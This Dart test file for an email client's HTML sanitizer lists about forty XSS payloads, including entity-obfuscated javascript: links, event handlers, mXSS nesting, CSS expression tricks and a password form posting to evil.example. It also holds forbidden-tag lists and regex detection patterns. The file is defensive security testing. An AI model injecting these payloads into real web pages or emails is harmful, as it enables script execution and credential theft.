// Очистка HTML писем против известных приёмов XSS (2.7.2, внешний обзор
// безопасности 23.11.2026, п. 10: WebView — бета, нужна проверка очистки).
// Результат проверяется разбором, а не поиском подстрок: в выходном HTML
// нет запрещённых тегов, обработчиков событий, опасных схем ссылок и
// картинок, опасного CSS — ни в обычной очистке (редактор, ответ), ни в
// очистке для окна письма (со стилями письма).
import 'package:flutter_test/flutter_test.dart';
import 'package:html/dom.dart' as dom;
import 'package:html/parser.dart' as html_parser;
import 'package:ogneliss/core/security/html_sanitizer.dart';
import 'package:ogneliss/core/security/security_utils.dart';

const _attacks = <String, String>{
  'script': '<script>alert(1)</script>',
  'onerror без кавычек': '<img src=x onerror=alert(1)>',
  'onclick у ссылки': '<a href="#" onclick="alert(1)">x</a>',
  'ontoggle у details': '<details open ontoggle=alert(1)><summary>x</summary></details>',
  'javascript: в ссылке': '<a href="javascript:alert(1)">x</a>',
  'регистр и пробелы': '<a href="  JaVaScRiPt:alert(1)">x</a>',
  'сущность в схеме': '<a href="java&#x73;cript:alert(1)">x</a>',
  'вся схема сущностями':
      '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
  '&colon;': '<a href="javascript&colon;alert(1)">x</a>',
  'табуляция в схеме': '<a href="jav&#x09;ascript:alert(1)">x</a>',
  'NUL в схеме': '<a href="java\u0000script:alert(1)">x</a>',
  'vbscript:': '<a href="vbscript:msgbox(1)">x</a>',
  'data:text/html': '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  'картинка javascript:': '<IMG SRC="jav&#x09;ascript:alert(1)">',
  'картинка data:svg': '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
  'srcset': '<img src="https://ok.example/a.png" srcset="https://evil.example/x.png 1x">',
  'svg onload': '<svg onload=alert(1)><script>alert(1)</script></svg>',
  'math mXSS': '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>',
  'noscript mXSS': '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  'вложенный script': '<scr<script>ipt>alert(1)</script>',
  'template': '<template><script>alert(1)</script></template>',
  'iframe': '<iframe src="https://evil.example"></iframe>',
  'object/embed': '<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x">',
  'форма с паролем': '<form action="https://evil.example"><input name="password"><button>OK</button></form>',
  'formaction': '<button formaction="javascript:alert(1)">x</button>',
  'base': '<base href="https://evil.example/"><a href="x">x</a>',
  'meta refresh': '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  'условный комментарий': '<!--[if gte mso 9]><script>alert(1)</script><![endif]--><p>текст</p>',
  'background у таблицы': '<table background="javascript:alert(1)"><tr><td>x</td></tr></table>',
  'xlink:href': '<a xlink:href="javascript:alert(1)">x</a>',
  'ping': '<a href="https://ok.example" ping="https://evil.example">x</a>',
  'CSS url(javascript:)': '<div style="background:url(javascript:alert(1))">x</div>',
  'CSS expression': '<div style="width: expression(alert(1))">x</div>',
  'CSS behavior': '<div style="behavior: url(x.htc)">x</div>',
  'CSS -moz-binding': '<div style="-moz-binding: url(x.xml#xss)">x</div>',
  'CSS position:fixed (перекрытие)': '<div style="position: fixed; top:0">поддельная кнопка</div>',
  'CSS экранирование': r'<div style="background:\75 rl(javascript:alert(1))">x</div>',
  'style @import': '<style>@import "https://evil.example/x.css"; p{color:red}</style><p>x</p>',
  'style javascript:': '<style>p{background:url("javascript:alert(1)")}</style><p>x</p>',
  'выход из style': '<style>p{}</style><script>alert(1)</script>',
  'разорванный </style>': '<style>p{}<</style/style><img src=x onerror=alert(1)></style>',
  'склейка javascript:': '<style>p{background:url(javajavascript:script:alert(1))}</style><p>x</p>',
};

const _allowedSchemesLink = ['http://', 'https://', 'mailto:', 'tel:', '#'];
const _allowedSchemesImg = ['http://', 'https://', 'cid:', 'data:image/png', 'data:image/jpeg', 'data:image/jpg',
  'data:image/gif', 'data:image/webp', 'data:image/bmp'];
const _forbiddenTags = {
  'script', 'iframe', 'frame', 'object', 'embed', 'svg', 'math', 'form', 'input', 'button', 'base', 'meta',
  'link', 'template', 'noscript', 'textarea', 'select', 'applet', 'portal', 'dialog',
};

/// Нарушения в очищенном HTML (пусто — безопасно).
List<String> _violations(String out) {
  final bad = <String>[];
  final doc = html_parser.parse(out);
  void walk(dom.Node n) {
    for (final c in n.nodes) {
      if (c is dom.Element) {
        final tag = (c.localName ?? '').toLowerCase();
        if (_forbiddenTags.contains(tag)) bad.add('тег <$tag>');
        c.attributes.forEach((k, v) {
          final name = k.toString().toLowerCase();
          final val = v.replaceAll(RegExp(r'[\u0000- ]'), '').toLowerCase();
          if (name.startsWith('on')) bad.add('обработчик $name');
          if (name == 'srcset' || name == 'ping' || name == 'formaction' || name == 'background' || name.contains(':')) {
            bad.add('атрибут $name');
          }
          if (name == 'href' && !_allowedSchemesLink.any(val.startsWith)) bad.add('ссылка $v');
          if (name == 'src' && !_allowedSchemesImg.any(val.startsWith)) bad.add('картинка $v');
          if (name == 'style' && RegExp(r'expression\(|javascript:|vbscript:|behavior:|-moz-binding|position:fixed|\\').hasMatch(val)) {
            bad.add('стиль $v');
          }
        });
        if (tag == 'style') {
          final css = c.text.toLowerCase().replaceAll(RegExp(r'\s'), '');
          if (RegExp(r'@import|javascript:|vbscript:|expression\(|behavior:|-moz-binding').hasMatch(css)) {
            bad.add('таблица стилей ${c.text}');
          }
        }
        walk(c);
      }
    }
  }

  walk(doc);
  return bad;
}

void main() {
  for (final e in _attacks.entries) {
    test('${e.key}: обычная очистка', () {
      expect(_violations(HtmlSanitizer.sanitize(e.value)), isEmpty);
      expect(_violations(SecurityUtils.sanitizeHtml(e.value)), isEmpty);
    });
    test('${e.key}: очистка для окна письма (со стилями)', () {
      expect(_violations(HtmlSanitizer.sanitizeKeepingStyles(e.value)), isEmpty);
    });
    test('${e.key}: для редактора (строка JavaScript)', () {
      final out = HtmlSanitizer.forEditor(e.value);
      expect(_violations(out), isEmpty);
      expect(out.contains(r'\'), isFalse, reason: 'обратная косая черта экранирована');
    });
  }

  test('безопасное остаётся: ссылки, картинки, таблицы, стили', () {
    const ok = '<p style="color:#333;margin:4px">Текст <a href="https://ogneliss.ru/x?a=1&amp;b=2">ссылка</a> '
        '<a href="mailto:a@b.ru">почта</a> <a href="tel:+79120000000">телефон</a></p>'
        '<img src="cid:logo@x" alt="лого"><img src="data:image/png;base64,iVBORw0KGgo=">'
        '<table border="1"><tr><td colspan="2">ячейка</td></tr></table>';
    final out = HtmlSanitizer.sanitize(ok);
    expect(out, contains('href="https://ogneliss.ru/x?a=1&amp;b=2"'));
    expect(out, contains('mailto:a@b.ru'));
    expect(out, contains('tel:+79120000000'));
    expect(out, contains('cid:logo@x'));
    expect(out, contains('data:image/png;base64'));
    expect(out, contains('colspan="2"'));
    expect(out, contains('color:#333'));
  });

  test('окно письма: url() картинок в стиле остаётся (загрузку решает CSP), опасное — нет', () {
    final out = HtmlSanitizer.sanitizeKeepingStyles(
        '<style>.a{background:url(https://ok.example/bg.png)} .b{width:expression(1)}</style><div class="a">x</div>');
    expect(out, contains('url(https://ok.example/bg.png)'));
    expect(out, isNot(contains('expression(')));
  });
}
